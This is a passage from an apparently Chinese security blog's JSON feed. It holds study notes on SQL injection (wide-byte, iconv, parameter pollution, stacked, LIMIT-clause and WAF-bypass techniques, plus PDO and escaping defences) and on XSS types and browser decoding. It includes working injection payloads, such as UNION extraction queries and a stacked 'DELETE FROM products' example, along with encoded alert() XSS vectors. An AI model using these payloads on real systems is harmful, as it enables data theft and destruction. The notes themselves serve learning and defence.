的编码，就可以进行宽字符注入。</p>\n<p>在防御宽字节时大家会发现一个函数，mysql_real_escape_string，文档里说了，考虑到连接的当前字符集。</p>\n<p>但在查询前必须指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk。</p>\n<p>这样就可以一定程度防止宽字节注入</p>\n<p>但最好的修复方法是采用二进制连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql_query(&#x27;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&#x27;，$conn)</span><br></pre></td></tr></table></figure>\n<p>或者采取 PDO 的方式查询</p>\n<p>utf-8 与 GBK 转换</p>\n<p>使用 iconv 函数转编码时调用 <code>iconv('utf-8', 'gbk', $_GET['word']);</code></p>\n<p>传入 <code>錦</code> 导致报错</p>\n<p>“錦 “这个字，它的 utf-8 编码是 <code>0xe98ca6</code> ，它的 gbk 编码是 <code>0xe55c</code> 。</p>\n<p><code>\\</code>  的 ascii 码正是 5c。那么，当我们的錦被 iconv 从 utf-8 转换成 gbk 后，变成了 % e5%5c，而后面的 <code>'</code>  被 addslashes 变成了 %5c%27，这样组合起来就是 % e5%5c%5c%27，两个 %5c 就是 \\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p>\n<p>如果我是用 iconv 将 gbk 转换成 utf-8 呢？</p>\n<p>我们知道一个 gbk 汉字 2 字节，utf-8 汉字 3 字节，如果我们把 gbk 转换成 utf-8，则 php 会每两个字节一转换。所以，如果 <code>\\'</code>  前面的字符是奇数的话，势必会吞掉 <code>\\</code> ， <code>'</code>  逃出限制。</p>\n<p>那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个</p>\n<p>对于多字节的符号，其第 2、3、4 字节的前两位都是 10，也就是说， <code>\\</code> （0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 <code>\\</code>  则 php 会报错</p>\n<p>但因为 gbk 编码中包含了 <code>\\</code> ，所以仍然可以利用</p>\n<p>参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2xlYXZlc29uZ3MuY29t\">leavesongs.com</span></p>\n<h5 id=\"hpp参数污染\"><a class=\"markdownIt-Anchor\" href=\"#hpp参数污染\">#</a> HPP 参数污染</h5>\n<p>对于当有多个 key 相同的参数时，不同服务器获取参数与情况</p>\n<p>?id=1&amp;id=10</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316200748174.png\" alt=\"image-20220316200748174\"></p>\n<p><strong>php 对于两个相同 key 的参数，取第二个</strong></p>\n<p>** 对于传入的非法的 $_GET 数组参数名，PHP 会将他们替换成下划线。** 经过 fuzz，有以下这些字符:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ . _ [ &#x27; &#x27;</span><br></pre></td></tr></table></figure>\n<p>通过 $_SERVER [‘REQUEST_URI’] 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</p>\n<p>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php 先将 user.id 转换成 user_id，即为 /t.php?user_id=11111&amp;user_id=22222 ，再获取到的 $_REQUEST [‘user_id’] 就是 22222。</p>\n<p>** 可在\\_SERVER\\['REQUEST\\_URI'\\]中，user\\_id和user\\.id却是两个完全不同的参数名**，那么切割覆盖后，获取的_REQUEST [‘user_id’] 却是 11111。</p>\n<p>最终 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,flag,3,4/**/from/**/users/**/limit/**/0,1</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,schema_name from information_schema.schemata,3,4/**/from/**/users/**/limit/**/0,1</span><br></pre></td></tr></table></figure>\n<h5 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h5>\n<p>Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>\n<p>堆叠注入原理</p>\n<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>\n<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限.</p>\n<p>以 sqllab less-38 举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class=\"line\">/* execute multi query */</span><br><span class=\"line\">if (mysqli_multi_query($con1, $sql))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    /* store first result set */</span><br><span class=\"line\">    if ($result = mysqli_store_result($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if($row = mysqli_fetch_row($result))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;\t</span><br><span class=\"line\">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">//            mysqli_free_result($result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        /* print divider */</span><br><span class=\"line\">    if (mysqli_more_results($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">            //printf(&quot;-----------------\\n&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     //while (mysqli_next_result($con1));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\techo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class=\"line\">\tprint_r(mysqli_error($con1));</span><br><span class=\"line\">\techo &quot;&lt;/font&gt;&quot;;  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">/* close connection */</span><br><span class=\"line\">mysqli_close($con1);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>堆叠注入部分参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC85NzIxNjg3Lmh0bWw=\">https://www.cnblogs.com/backlion/p/9721687.html</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220321165558549.png\" alt=\"image-20220321165558549\" style=\"zoom:67%;\" />\n<h5 id=\"update-insert语句中注入\"><a class=\"markdownIt-Anchor\" href=\"#update-insert语句中注入\">#</a> update /insert 语句中注入</h5>\n<p>sqllab pass-17</p>\n<p>数据外带</p>\n<p>floor 报错注入</p>\n<p><strong>注意：update 语句中无法使用 updatexml 和 extractvalue 报错注入</strong></p>\n<h5 id=\"limit中注入\"><a class=\"markdownIt-Anchor\" href=\"#limit中注入\">#</a> limit 中注入</h5>\n<p>只适用于 mysql 版本 &lt; 5.5</p>\n<p>使用存储过程</p>\n<p>为什么要用存储过程？<br>\n①将重复性很高的一些操作，封装到一个存储过程中，简化了对这些 SQL 的调用</p>\n<p>②批量处理：SQL + 循环，减少流量</p>\n<p>③统一接口，确保数据的安全</p>\n<p>使用存储过程：</p>\n<p>procedure analyse (1,2) 报错在第一个参数上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>\n<p>时间盲注时但存储过程无法使用 sleep，无法盲注，使用 benchmark 代替 sleep</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>\n<h3 id=\"mysql注入防御\"><a class=\"markdownIt-Anchor\" href=\"#mysql注入防御\">#</a> mysql 注入防御</h3>\n<h4 id=\"通过函数过滤\"><a class=\"markdownIt-Anchor\" href=\"#通过函数过滤\">#</a> 通过函数过滤</h4>\n<p><code>$id = addslashed($id);</code>  使用 \\ 转义字符，比如’ &quot; \\ NULL</p>\n<p>注意 GPG 开关开启时会默认转义所有输入，如果这时才使用此函数会造成双重转义使转义失效</p>\n<p><code>$id = addcslashed($id); </code>  使用 c 语言风格转义函数 \\0 \\r 等</p>\n<h4 id=\"降权\"><a class=\"markdownIt-Anchor\" href=\"#降权\">#</a> 降权</h4>\n<p>给每个数据库设置单独的管理员，不使用 root，sa 等高权限用户</p>\n<h4 id=\"使用pdo\"><a class=\"markdownIt-Anchor\" href=\"#使用pdo\">#</a> 使用 PDO</h4>\n<p>预处理语句可以把它看作是想要运行的 SQL 的一种编译过的模板，它可以使用变量参数进行定制。</p>\n<p>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。</p>\n<p>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生 SQL 注入。</p>\n<p>与处理语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p>这与我们平时使用 mysql_real_escape_string 将字符串进行转义，再拼接成 SQL 语句没有差别，只是由 PDO 本地驱动完成转义的（EMULATE_PREPARES）</p>\n<p>PDO 有一项参数，名为 PDO::ATTR_EMULATE_PREPARES ，表示是否使用 PHP 本地模拟 prepare，此项参数默认 true, 我们改为 false 后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过waf\"><a class=\"markdownIt-Anchor\" href=\"#绕过waf\">#</a> 绕过 waf</h3>\n<p>1. 过滤，</p>\n<p>通过 join 绕过，将查询结果当做一张表，将多张表使用 join 连接</p>\n<p>select 1,2,3 union select * from (select version()) a join  (select user()) b join  (select database()) c --+;</p>\n",
            "tags": [
                "SQL injection"
            ]
        },
        {
            "id": "http://example.com/2022/02/17/xss/",
            "url": "http://example.com/2022/02/17/xss/",
            "title": "XSS",
            "date_published": "2022-02-17T05:38:45.000Z",
            "content_html": "<h1 id=\"xss\"><a class=\"markdownIt-Anchor\" href=\"#xss\">#</a> XSS</h1>\n<h2 id=\"session-cookie\"><a class=\"markdownIt-Anchor\" href=\"#session-cookie\">#</a> session || cookie</h2>\n<p>1.Cookie 的工作原理<br>\n（1）浏览器端第一次发送请求到服务器端</p>\n<p>（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端</p>\n<p>（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie</p>\n<p>（4）服务器端通过 Cookie 中携带的数据区分不同的用户</p>\n<p>————————————————</p>\n<p>2.Session 的工作原理</p>\n<p>（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端</p>\n<p>（2）浏览器端发送第 N（N&gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象</p>\n<p>（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。</p>\n<p>name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象</p>\n<p>value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>value 为 SessionId 存在，返回 session 对象</p>\n<p>————————————————</p>\n<p>(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；</p>\n<p>(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session</p>\n<p>(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE</p>\n<p>(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。</p>\n<p>(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xMzMzMzMzNjY3Ny9hcnRpY2xlL2RldGFpbHMvMTAwOTM5MDMw\">(62 条消息) Cookie 和 Session 的区别（面试必备）_秋风不识路的博客 - CSDN 博客_cookie 与 session 区别</span></p>\n<h2 id=\"1反射型xss\"><a class=\"markdownIt-Anchor\" href=\"#1反射型xss\">#</a> 1. 反射型 xss</h2>\n<p>反射型 XSS 是非持久性、参数型的跨站脚本。反射型 XSS 的 JS 代码在 Web 应用的参数（变量）中，如搜 索框的反射型 XSS。在搜索框中，提交 PoC [scriptalert (/xss/)/script]，点击搜索，即可触发反射型 XSS。 注意到，我们提交的 poc 会出现在 search.php 页面的 keywords 参数中。</p>\n<h2 id=\"2存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#2存储型xss\">#</a> 2. 存储型 XSS</h2>\n<p>存储型 XSS 是持久性跨站脚本。持久性体现在 XSS 代码不是在某个参数（变量）中，而是写进数据库或 文件等可以永久保存数据的介质中。存储型 XSS 通常发生在留言板等地方。我们在留言板位置留言，将 恶意代码写进数据库中。此时，我们只完成了第一步，将恶意代码写入数据库。因为 XSS 使用的 JS 代 码，JS 代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的 XSS 代码，才能真正触发 XSS。 此时，需要我们模拟网站后台管理员的身份，查看留言。</p>\n<h2 id=\"3基于dom的\"><a class=\"markdownIt-Anchor\" href=\"#3基于dom的\">#</a> 3. 基于 DOM 的</h2>\n<p>XSS DOM XSS 比较特殊。owasp 关于 DOM 型号 XSS 的定义是基于 DOM 的 XSS 是一种 XSS 攻击，其中攻击 的 payload 由于修改受害者浏览器页面的 DOM 树而执行的。其特殊的地方就是 payload 在浏览器本地修 改 DOM 树而执行， 并不会传到服务器上，这也就使得 DOM XSS 比较难以检测。</p>\n<p>URL 的每一个参数、URL 本身、表单、搜索框、常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等</p>\n<h2 id=\"浏览器解析机制\"><a class=\"markdownIt-Anchor\" href=\"#浏览器解析机制\">#</a> 浏览器解析机制</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.&lt;a href=<span class=\"string\">&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;</span>&gt;aaa&lt;/a&gt;</span><br><span class=\"line\"><span class=\"comment\">// 解析不了,href后的编码会使用实体编码解析，不能解析url编码</span></span><br><span class=\"line\">http:<span class=\"comment\">//127.0.0.1:18888/javascript:alert%281%29</span></span><br><span class=\"line\">URL 编码 <span class=\"string\">&quot;javascript:alert(1)&quot;</span></span><br><span class=\"line\"><span class=\"number\">2</span>.&lt;a href=<span class=\"string\">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span><br><span class=\"line\">HTML字符实体编码 <span class=\"string\">&quot;javascript&quot;</span> 和 URL 编码 <span class=\"string\">&quot;alert(2)&quot;</span></span><br><span class=\"line\">  JavaScript支持Unicode，hex，utf-<span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"number\">3</span>.&lt;a href=<span class=\"string\">&quot;javascript%3aalert(3)&quot;</span>&gt;&lt;/a&gt;</span><br><span class=\"line\">URL 编码 <span class=\"string\">&quot;:&quot;</span></span><br><span class=\"line\">  js不能编码符号</span><br><span class=\"line\"><span class=\"number\">4</span>.&lt;div&gt;&amp;<span class=\"comment\">#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</span></span><br><span class=\"line\">HTML字符实体编码 &lt; 和 &gt;</span><br><span class=\"line\">  会解析但不会执行</span><br><span class=\"line\"><span class=\"number\">5</span>.&lt;textarea&gt;&amp;<span class=\"comment\">#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span></span><br><span class=\"line\">HTML字符实体编码 &lt; 和 &gt;</span><br><span class=\"line\">    会解析但不会执行</span><br><span class=\"line\"><span class=\"number\">6</span>.&lt;textarea&gt;&lt;script&gt;<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">6</span>)&lt;/script&gt;&lt;/textarea&gt;</span><br><span class=\"line\">    会解析但不会执行</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;!-- 不能解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;aaa&lt;/a&gt;&lt;br&gt;   </span><br><span class=\"line\">    &lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</span><br><span class=\"line\">    &lt;!-- js中符号不能编码 --&gt;</span><br><span class=\"line\">    &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- html解析完不能执行，&lt;不能编码，浏览器中直接显示img标签 --&gt;</span><br><span class=\"line\">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- textarea中的标签可以被解码，但不能被解析，&lt;script&gt;alert(5)&lt;/script&gt; --&gt;</span><br><span class=\"line\">    &lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- textarea中所有标签都不能被解析 --&gt;</span><br><span class=\"line\">    &lt;button onclick=&quot;confirm(&#x27;8\\u0027);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 不能编码符号 --&gt;</span><br><span class=\"line\">    &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 原始字符块只能容纳文本，会被解析为文本 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 不能对()及其里面的内容编码 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 同理 --&gt;</span><br><span class=\"line\">    &lt;script&gt;alert(&#x27;14\\u000a)&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- Unicode 编码换行符（0x0A）,但不会引起真正的换行 --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 可以解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;bbb&lt;/a&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 直接通过html解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;ccc&lt;/a&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 通过html解析为javascript，js在解析url编码 --&gt;</span><br><span class=\"line\">    &lt;button onclick=&quot;confirm(&#x27;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 先html解析，编码，再给js解析 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 编码alert，函数名可以解析 --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    在解析一篇HTML文档时主要有三个处理过程：HTML解析，URL解析和JavaScript解析</span><br><span class=\"line\">    一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个&#x27;&lt;&#x27;符号&#x27;（后面没有跟&#x27;/&#x27;符号）&#x27;就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</span><br><span class=\"line\">    &lt;input value=&quot;xxx&quot;&gt;  由于没有&gt;,value中的内容无法进入数据状态解析</span><br><span class=\"line\">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;  </span><br><span class=\"line\">    &lt;textarea&gt;由于有完整的&lt;&gt;，因此可以解析后面的内容，把&amp;#60解析为&lt;,但不会进入数据开始状态</span><br><span class=\"line\">    